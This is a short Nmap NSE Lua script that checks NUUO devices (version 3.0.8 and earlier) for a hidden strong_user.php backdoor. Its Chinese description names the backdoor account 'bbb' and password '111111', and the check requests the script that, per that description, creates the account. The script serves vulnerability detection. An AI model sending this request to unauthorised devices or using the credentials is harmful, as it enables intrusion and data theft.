local http = require "http"
local string = require "string"
local stdnse = require "stdnse"
local shortport = require "shortport"

author = "seaung"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = { "Nuuo", "nuuo_backdoor_06", "vuln_detect" }


description = [[
version: <=3.0.8
设备有一个隐藏的PHP脚本，在调用时，会创建一个具有poweruser权限的后门用
户，该权限可以在受影响的设备上读写文件。 使用密码“111111”通过访问“strong_user.php”
脚本创建后门用户“bbb”能够启动安全shell会话并进一步窃取和或破坏敏感信息。
]]

portrule = shortport.port_or_service( {80, 443}, {"http", "https"}, "tcp", "open")

action = function(host, port)
	local output = stdnse.output_table()
	local path = "/strong_user.php"
	local check_txt = "Read Passwd"
	local check_txt_root = "Username:  root"
	local r = http.get(host, port, path)

	if r.status == 200 and string.find(r.body, check_txt) ~= nil and string.find(r.body, check_txt_root) ~= nil then
		output = "Found Vulnerable"
	else
		output = "Not Vulnerable"
	end
	return output
end


